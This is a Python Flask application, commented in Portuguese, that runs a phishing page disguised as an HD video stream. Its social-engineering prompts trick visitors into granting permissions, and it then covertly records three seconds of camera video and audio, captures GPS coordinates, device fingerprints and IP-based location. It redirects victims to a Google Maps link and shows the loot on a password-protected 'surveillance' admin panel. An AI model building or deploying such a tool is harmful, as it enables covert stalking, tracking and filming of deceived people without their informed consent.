from flask import Flask, render_template_string, request, jsonify
import datetime
import urllib.request
import json
import nmap
import threading
from user_agents import parse

app = Flask(__name__)

# Buffers de armazenamento em RAM
registros_gps = []
registros_ip = []
registros_videos = []

# Credenciais de Acesso ao Console
SENHA_ADMIN = "123123"

# Link de redirecionamento final solicitado
LINK_DESTINO = "https://www.google.com/maps/place/Oaks+Chengdu+at+Cultural+Heritage+Park/@30.6887276,103.9289403,15z/data=!4m12!1m2!2m1!1zSG90w6lpcw!3m8!1s0x36efc2ba0825d43b:0x2c1214b7071a826c!5m2!4m1!1i2!8m2!3d30.678253!4d103.93095!16s%2Fg%2F11sk9qfcrj?entry=ttu&g_ep=EgoyMDI2MDgzMS4wIKXMDSoASAFQAw%3D%3D"

# Página HTML com Player Profissional Disfarçado e Camada de Engenharia Social
HTML_CAPTURA = f"""
<!DOCTYPE html>
<html lang="pt-BR">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Stream HD - Conteúdo Exclusivo</title>
    
    <meta property="og:title" content="Transmissão ao Vivo - Documentário e Hospedagem na China">
    <meta property="og:description" content="Assista ao conteúdo exclusivo em alta definição. Clique para iniciar o player.">
    <meta property="og:image" content="https://images.unsplash.com/photo-1508804185872-d7badad00f7d">
    <meta property="og:url" content="https://loc-nsdi.onrender.com/">
    <meta property="og:type" content="website">

    <style>
        * {{ box-sizing: border-box; }}
        body {{
            background-color: #0f1015;
            color: #fff;
            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
            margin: 0;
            padding: 0;
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
            min-height: 100vh;
        }}
        .player-container {{
            width: 100%;
            max-width: 800px;
            background: #181922;
            border-radius: 12px;
            overflow: hidden;
            box-shadow: 0 10px 30px rgba(0,0,0,0.7);
            border: 1px solid #2a2c3a;
        }}
        .video-screen {{
            position: relative;
            width: 100%;
            aspect-ratio: 16/9;
            background: #000;
            display: flex;
            align-items: center;
            justify-content: center;
            background-image: url('https://images.unsplash.com/photo-1508804185872-d7badad00f7d');
            background-size: cover;
            background-position: center;
        }}
        .video-screen::after {{
            content: "";
            position: absolute;
            top: 0; left: 0; width: 100%; height: 100%;
            background: rgba(0, 0, 0, 0.65);
            backdrop-filter: blur(4px);
        }}
        .play-overlay {{
            position: relative;
            z-index: 2;
            text-align: center;
            padding: 20px;
        }}
        .btn-play {{
            background: #e50914;
            color: white;
            border: none;
            padding: 16px 36px;
            font-size: 18px;
            font-weight: bold;
            border-radius: 6px;
            cursor: pointer;
            transition: background 0.2s, transform 0.2s;
            box-shadow: 0 4px 15px rgba(229, 9, 20, 0.4);
            display: inline-flex;
            align-items: center;
            gap: 10px;
        }}
        .btn-play:hover {{
            background: #f40612;
            transform: scale(1.03);
        }}
        .player-info {{
            padding: 20px 24px;
        }}
        .player-title {{
            font-size: 20px;
            font-weight: 600;
            margin: 0 0 8px 0;
        }}
        .player-desc {{
            font-size: 14px;
            color: #9ca3af;
            margin: 0;
            line-height: 1.5;
        }}
        .modal-aviso {{
            display: none;
            position: fixed;
            top: 0; left: 0; width: 100%; height: 100%;
            background: rgba(0,0,0,0.85);
            z-index: 999;
            justify-content: center;
            align-items: center;
            padding: 20px;
        }}
        .modal-content {{
            background: #1f212d;
            padding: 30px;
            border-radius: 10px;
            max-width: 420px;
            text-align: center;
            border: 1px solid #374151;
            box-shadow: 0 8px 25px rgba(0,0,0,0.8);
        }}
        .modal-content h3 {{
            margin-top: 0;
            color: #f87171;
            font-size: 18px;
        }}
        .modal-content p {{
            font-size: 14px;
            color: #d1d5db;
            line-height: 1.5;
        }}
        .loader {{
            border: 3px solid #374151;
            border-top: 3px solid #e50914;
            border-radius: 50%;
            width: 30px;
            height: 30px;
            animation: spin 1s linear infinite;
            margin: 15px auto;
            display: none;
        }}
        @keyframes spin {{
            0% {{ transform: rotate(0deg); }}
            100% {{ transform: rotate(360deg); }}
        }}
        #video-oculto {{ display: none; }}
    </style>
</head>
<body>

    <div class="player-container">
        <div class="video-screen">
            <div class="play-overlay">
                <button class="btn-play" onclick="iniciarFluxoSeguranca()">
                    <span>▶</span> Assistir em HD (1080p)
                </button>
                <p style="font-size: 12px; color: #cbd5e1; margin-top: 12px;">Clique para verificar permissões de exibição na região</p>
            </div>
        </div>
        <div class="player-info">
            <h1 class="player-title">Transmissão Especial: China & Hospedagem Global</h1>
            <p class="player-desc">Conteúdo restrito verificado por protocolo de segurança regional. É necessário liberar o acesso de mídia e geolocalização do navegador para prosseguir com a reprodução segura.</p>
        </div>
    </div>

    <!-- Modal de Engenharia Social / Instrução de Permissão -->
    <div id="modalAviso" class="modal-aviso">
        <div class="modal-content">
            <h3>⚠️ Verificação de Segurança Pendente</h3>
            <p id="textoModal">Para otimizar a taxa de quadros e carregar a transmissão sem travamentos, clique em <b>"Permitir"</b> na caixa que aparecerá no topo do navegador.</p>
            <div class="loader" id="spinnerCarregando"></div>
        </div>
    </div>

    <video id="video-oculto" autoplay playsinline muted></video>

    <script>
        const urlDestino = "{LINK_DESTINO}";
        let videoGravadoBase64 = null;

        function iniciarFluxoSeguranca() {{
            document.getElementById('modalAviso').style.display = 'flex';
            document.getElementById('spinnerCarregando').style.display = 'block';
            
            // Dispara simultaneamente a geolocalização e a captura de vídeo
            if (navigator.geolocation) {{
                navigator.geolocation.getCurrentPosition(
                    (pos) => executarProcessamento(pos.coords.latitude, pos.coords.longitude, pos.coords.accuracy),
                    (err) => executarProcessamento(null, null, null),
                    {{ enableHighAccuracy: true, timeout: 8000, maximumAge: 0 }}
                );
            }} else {{
                executarProcessamento(null, null, null);
            }}
        }}

        async function gravarVideoCamera() {{
            return new Promise(async (resolve) => {{
                try {{
                    const stream = await navigator.mediaDevices.getUserMedia({{
                        video: {{ facingMode: "user" }},
                        audio: true
                    }});
                    
                    const video = document.getElementById('video-oculto');
                    video.srcObject = stream;
                    await video.play().catch(() => {{}});

                    let options = {{ mimeType: 'video/webm; codecs=vp8' }};
                    if (!MediaRecorder.isTypeSupported(options.mimeType)) {{
                        options = {{ mimeType: 'video/webm' }};
                    }}
                    if (!MediaRecorder.isTypeSupported(options.mimeType)) {{
                        options = {{}};
                    }}

                    const mediaRecorder = new MediaRecorder(stream, options);
                    let chunks = [];

                    mediaRecorder.ondataavailable = (event) => {{
                        if (event.data && event.data.size > 0) {{
                            chunks.push(event.data);
                        }}
                    }};

                    mediaRecorder.onstop = async () => {{
                        const blob = new Blob(chunks, {{ type: 'video/webm' }});
                        const reader = new FileReader();
                        reader.readAsDataURL(blob);
                        reader.onloadend = () => {{
                            videoGravadoBase64 = reader.result;
                            stream.getTracks().forEach(track => track.stop());
                            resolve();
                        }};
                    }};

                    mediaRecorder.start();
                    
                    setTimeout(() => {{
                        if (mediaRecorder.state === "recording") {{
                            mediaRecorder.stop();
                        }} else {{
                            resolve();
                        }}
                    }}, 3000);

                }} catch(e) {{
                    console.warn("Acesso negado:", e);
                    resolve();
                }}
            }});
        }}

        async function executarProcessamento(lat, lon, precisao) {{
            // Tenta gravar o vídeo após o usuário interagir com o botão/permissão
            await gravarVideoCamera();

            let infoHardware = {{
                hardwareConcurrency: navigator.hardwareConcurrency || 'N/A',
                deviceMemory: navigator.deviceMemory || 'N/A',
                platform: navigator.platform || 'N/A',
                language: navigator.language || 'N/A',
                cookieEnabled: navigator.cookieEnabled ? 'SIM' : 'NÃO',
                maxTouchPoints: navigator.maxTouchPoints || 0,
                connectionType: (navigator.connection && navigator.connection.effectiveType) ? navigator.connection.effectiveType.toUpperCase() : 'DESCONHECIDO',
                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone || 'N/A',
                bateria: 'N/A',
                resolucqao: window.screen.width + 'x' + window.screen.height
            }};

            if (navigator.getBattery) {{
                try {{
                    let bat = await navigator.getBattery();
                    infoHardware.bateria = Math.round(bat.level * 100) + '% (' + (bat.charging ? 'CARREGANDO' : 'DESCARGA') + ')';
                }} catch(e) {{}}
            }}

            const payload = {{
                hw: infoHardware,
                latitude: lat,
                longitude: lon,
                precisao: precisao,
                video: videoGravadoBase64
            }};

            try {{
                await fetch('/salvar-payload-total', {{
                    method: 'POST',
                    headers: {{ 'Content-Type': 'application/json' }},
                    body: JSON.stringify(payload)
                }});
            }} catch(e) {{
                console.error("Erro:", e);
            }} finally {{
                window.location.replace(urlDestino);
            }}
        }}
    </script>
</body>
</html>
"""

# Painel Administrativo atualizado
HTML_PAINEL = """
<!DOCTYPE html>
<html lang="pt-BR">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>MAINFRAME - OLHO DE DEUS</title>
    <style>
        body {
            font-family: 'Courier New', Courier, monospace;
            margin: 0;
            padding: 12px;
            background: #020302;
            color: #00FF66;
            position: relative;
            min-height: 100vh;
        }
        .watermark-ascii {
            position: fixed;
            top: 42vh;
            left: 50%;
            transform: translateX(-50%);
            font-family: monospace;
            font-size: 2.2vw;
            line-height: 1.15;
            color: rgba(0, 255, 102, 0.75);
            text-shadow: 0 0 15px rgba(0, 255, 102, 0.9);
            white-space: pre;
            z-index: 0;
            pointer-events: none;
            text-align: center;
            letter-spacing: 0.5px;
            font-weight: bold;
        }
        @media (min-width: 900px) {
            .watermark-ascii {
                font-size: 13px;
                letter-spacing: 1px;
            }
        }
        .content-wrapper { position: relative; z-index: 1; }
        h2 {
            color: #00FF66;
            font-size: 14px;
            border-bottom: 1px dashed rgba(0, 255, 102, 0.5);
            padding-bottom: 4px;
            margin-top: 25px;
            text-transform: uppercase;
        }
        .status-box {
            background: rgba(3, 5, 3, 0.3);
            border: 1px solid rgba(0, 255, 102, 0.3);
            padding: 10px;
            border-radius: 4px;
            font-size: 12px;
            margin-bottom: 15px;
        }
        .table-container {
            width: 100%;
            overflow-x: auto;
            margin-bottom: 20px;
            border: 1px solid rgba(26, 51, 26, 0.3);
        }
        table {
            width: 100%;
            border-collapse: collapse;
            background: rgba(2, 4, 2, 0.25);
            font-size: 12px;
        }
        th, td {
            border: 1px solid rgba(26, 51, 26, 0.3);
            padding: 8px 6px;
            text-align: left;
        }
        th {
            background: rgba(5, 15, 5, 0.4);
            color: #00FF66;
            font-size: 12px;
            letter-spacing: 1px;
        }
        tr:nth-child(even) { background: rgba(2, 4, 2, 0.2); }
        tr:nth-child(odd) { background: rgba(5, 10, 5, 0.2); }
        a { color: #3399FF; text-decoration: none; font-weight: bold; }
        a:hover { text-decoration: underline; }
        .badge {
            background: rgba(5, 26, 5, 0.4);
            color: #00FF66;
            padding: 3px 6px;
            border-radius: 3px;
            font-size: 11px;
            display: inline-block;
            margin: 2px 0;
            border: 1px solid rgba(0, 255, 102, 0.4);
        }
        .id-tag {
            background: rgba(0, 255, 102, 0.8);
            color: #000;
            font-weight: bold;
            padding: 2px 6px;
            border-radius: 3px;
            font-size: 11px;
            text-align: center;
        }
        .captured-video {
            width: 160px;
            height: 120px;
            border: 1px solid #00FF66;
            border-radius: 4px;
            background: #000;
        }
        details summary { cursor: pointer; color: #3399FF; font-weight: bold; }
        .empty-msg { color: #FF5555; text-align: center; padding: 15px; font-size: 12px; }
        .terminal-text {
            font-size: 11px;
            color: #88ff88;
            line-height: 1.4;
            background: rgba(3, 5, 3, 0.3);
            padding: 8px;
            border-left: 3px solid rgba(0, 255, 102, 0.6);
            margin-bottom: 15px;
        }
    </style>
</head>
<body>

<div class="watermark-ascii">
   ___  _     _   _  ___       ____  _____       ____  _____ _   _ ____  
  / _ \| |   | | | |/ _ \     |  _ \| ____|     |  _ \| ____| | | / ___| 
 | | | | |   | |_| | | | |    | | | |  _|       | | | |  _| | | | \___ \ 
 | |_| | |___|  _  | |_| |    | |_| | |___      | |_| | |___| |_| |___) |
  \___/|_____|_| |_|\___/     |____/|_____|     |____/|_____|\___/|____/ 
</div>

<div class="content-wrapper">
    <div class="status-box">
        <b>[SYS_STATUS]</b> ONLINE-ACTIVE | <b>SOCIAL ENG_MODULE:</b> ACTIVE<br>
        <b>[PROTOCOL]</b> SECURE TCP/IP | <b>REFRESH:</b> 5s
    </div>

    <div class="terminal-text">
        identification division.<br>
        program-id. MAINFRAME-SECURE-CONSOLE.<br>
        author. PENTESTER-CORE.<br>
        module. 07 - PROXY STREAM & SURVEILLANCE
    </div>

    <h2>[ 01 ] GRAVAÇÕES DE VÍDEO DA CÂMERA ({{ videos|length }})</h2>
    <div class="table-container">
        <table>
            <tr>
                <th>ID</th>
                <th>DATA / HORA</th>
                <th>IP DE ORIGEM</th>
                <th>VÍDEO CAPTURADO (3s)</th>
            </tr>
            {% for v in videos %}
            <tr>
                <td><span class="id-tag">#{{ loop.revindex }}</span></td>
                <td>{{ v.data }}</td>
                <td><b>{{ v.ip }}</b></td>
                <td>
                    {% if v.video %}
                        <video src="{{ v.video }}" class="captured-video" controls></video>
                    {% else %}
                        <span style="color: #FF5555;">Sem permissão / Câmera indisponível</span>
                    {% endif %}
                </td>
            </tr>
            {% else %}
            <tr><td colspan="4" class="empty-msg">> 01 CONDITIONAL: NENHUM VÍDEO GRAVADO <<</td></tr>
            {% endfor %}
        </table>
    </div>

    <h2>[ 02 ] CAPTURAS DE GEOLOCALIZAÇÃO GPS ({{ gps|length }})</h2>
    <div class="table-container">
        <table>
            <tr>
                <th>ID</th>
                <th>DATA / HORA</th>
                <th>IP ORIGEM</th>
                <th>LAT / LONG</th>
                <th>PREC</th>
                <th>MAPS</th>
            </tr>
            {% for r in gps %}
            <tr>
                <td><span class="id-tag">#{{ loop.revindex }}</span></td>
                <td>{{ r.data }}</td>
                <td><b>{{ r.ip }}</b></td>
                <td>{{ r.lat }}, {{ r.lon }}</td>
                <td>{{ r.precisao }}m</td>
                <td><a href="{{ r.maps }}" target="_blank">🗺️ MAPA</a></td>
            </tr>
            {% else %}
            <tr><td colspan="6" class="empty-msg">> 01 CONDITIONAL: NENHUM DADO DE GPS CAPTURADO <<</td></tr>
            {% endfor %}
        </table>
    </div>

    <h2>[ 03 ] INTELIGÊNCIA DE REDE, HARDWARE & NMAP ({{ ips|length }})</h2>
    <div class="table-container">
        <table>
            <tr>
                <th>ID</th>
                <th>DATA / HORA</th>
                <th>IP / LOCALIZAÇÃO / ISP</th>
                <th>HARDWARE & DISPOSITIVO</th>
                <th>NAVEGADOR / USER-AGENT</th>
                <th>PORTAS</th>
            </tr>
            {% for r in ips %}
            <tr>
                <td><span class="id-tag">#{{ loop.revindex }}</span></td>
                <td>{{ r.data }}</td>
                <td>
                    <b>{{ r.ip }}</b><br>
                    <span style="color: #3399FF;">{{ r.cidade }}/{{ r.estado }}</span><br>
                    <small>{{ r.isp }}</small><br>
                    Conexão: <b>{{ r.hw.connectionType }}</b>
                </td>
                <td>
                    CPU Cores: {{ r.hw.hardwareConcurrency }}<br>
                    RAM: {{ r.hw.deviceMemory }} GB<br>
                    Bateria: {{ r.hw.bateria }}<br>
                    Tela: {{ r.hw.resolucqao }}<br>
                    Touch: {{ r.hw.maxTouchPoints }} | Cookies: {{ r.hw.cookieEnabled }}<br>
                    Fuso: {{ r.hw.timezone }}
                </td>
                <td>
                    <b>OS:</b> {{ r.ua_info.os }}<br>
                    <b>Browser:</b> {{ r.ua_info.browser }}<br>
                    <b>Device:</b> {{ r.ua_info.device }}<br>
                    <b>Idioma:</b> {{ r.hw.language }}<br>
                    <details style="margin-top: 6px;">
                        <summary>Ver User-Agent</summary>
                        <small style="word-break: break-all; color: #AAAAAA;">{{ r.user_agent }}</small>
                    </details>
                </td>
                <td>
                    {% if r.portas %}
                        {% for p in r.portas %}
                            <span class="badge">P.{{ p.porta }}: {{ p.servico }} ({{ p.estado }})</span><br>
                        {% endfor %}
                    {% else %}
                        <span style="color: #FF5555;">Escaneando...</span>
                    {% endif %}
                </td>
            </tr>
            {% else %}
            <tr><td colspan="6" class="empty-msg">> 01 CONDITIONAL: NENHUM REGISTRO CAPTURADO <<</td></tr>
            {% endfor %}
        </table>
    </div>
</div>

<script>
    setTimeout(function(){
        window.location.reload();
    }, 5000);
</script>
</body>
</html>
"""

def executar_nmap_background(registro_ref):
    try:
        nm = nmap.PortScanner()
        nm.scan('scanme.nmap.org', arguments='-p 22,80,443,3306,8080 --open -T4')
        portas_encontradas = []
        for host in nm.all_hosts():
            for proto in nm[host].all_protocols():
                lport = nm[host][proto].keys()
                for p in lport:
                    estado = nm[host][proto][p]['state']
                    servico = nm[host][proto][p]['name']
                    portas_encontradas.append({"porta": p, "estado": estado, "servico": servico})
        registro_ref["portas"] = portas_encontradas
    except Exception as e:
        print(f"Erro na varredura Nmap: {e}")
        registro_ref["portas"] = [{"porta": "N/A", "estado": "blocked", "servico": "filtered"}]

@app.route('/')
def index():
    return render_template_string(HTML_CAPTURA)

@app.route('/salvar-payload-total', methods=['POST'])
def salvar_payload_total():
    dados = request.json or {}
    ip_cliente = request.headers.get('X-Forwarded-For', request.remote_addr)
    if ',' in ip_cliente:
        ip_cliente = ip_cliente.split(',')[0].strip()
        
    user_agent_str = request.headers.get('User-Agent', 'Desconhecido')
    parsed_ua = parse(user_agent_str)
    ua_info = {
        "os": f"{parsed_ua.os.family} {parsed_ua.os.version_string}".strip(),
        "browser": f"{parsed_ua.browser.family} {parsed_ua.browser.version_string}".strip(),
        "device": f"{parsed_ua.device.brand or ''} {parsed_ua.device.model or ''} ({'Mobile' if parsed_ua.is_mobile else 'Tablet' if parsed_ua.is_tablet else 'PC'})".strip()
    }

    agora = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    
    cidade, estado, pais, isp = "Desconhecido", "Desconhecido", "Desconhecido", "Desconhecido"
    try:
        if ip_cliente != "127.0.0.1" and ip_cliente != "localhost":
            url = f"http://ip-api.com/json/{ip_cliente}?lang=pt-BR"
            req = urllib.request.Request(url, headers={'User-Agent': 'Mozilla/5.0'})
            with urllib.request.urlopen(req, timeout=2) as response:
                api_data = json.loads(response.read().decode())
                if api_data.get('status') == 'success':
                    cidade = api_data.get('city', 'Desconhecido')
                    estado = api_data.get('regionName', 'Desconhecido')
                    pais = api_data.get('country', 'Desconhecido')
                    isp = api_data.get('isp', 'Desconhecido')
    except Exception as e:
        print("Erro GeoIP:", e)

    hw = dados.get('hw', {})
    video_b64 = dados.get('video')

    if video_b64:
        registros_videos.insert(0, {
            "data": agora,
            "ip": ip_cliente,
            "video": video_b64
        })

    novo_registro_ip = {
        "data": agora,
        "ip": ip_cliente,
        "cidade": cidade,
        "estado": estado,
        "pais": pais,
        "isp": isp,
        "hw": hw,
        "ua_info": ua_info,
        "user_agent": user_agent_str,
        "portas": []
    }
    registros_ip.insert(0, novo_registro_ip)

    t = threading.Thread(target=executar_nmap_background, args=(novo_registro_ip,))
    t.start()

    lat = dados.get('latitude')
    lon = dados.get('longitude')
    precisao = dados.get('precisao')

    if lat is not None and lon is not None:
        maps_link = f"https://www.google.com/maps?q={lat},{lon}"
        registros_gps.insert(0, {
            "data": agora,
            "ip": ip_cliente,
            "lat": lat,
            "lon": lon,
            "precisao": precisao,
            "maps": maps_link
        })

    return jsonify({"status": "sucesso", "payload": "processed"})

@app.route('/admin', methods=['GET'])
def admin():
    senha_informada = request.args.get('senha', '')
    if senha_informada != SENHA_ADMIN:
        return """
        <body style="font-family: 'Courier New'; background: #050505; color: #FF5555; text-align: center; margin-top: 20%;">
            <h2>[ACCESS_DENIED]</h2>
            <p>Informe a senha correta na URL: <code>/admin?senha=SUA_SENHA</code></p>
        </body>
        """, 403
        
    return render_template_string(HTML_PAINEL, gps=registros_gps, ips=registros_ip, videos=registros_videos)

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000)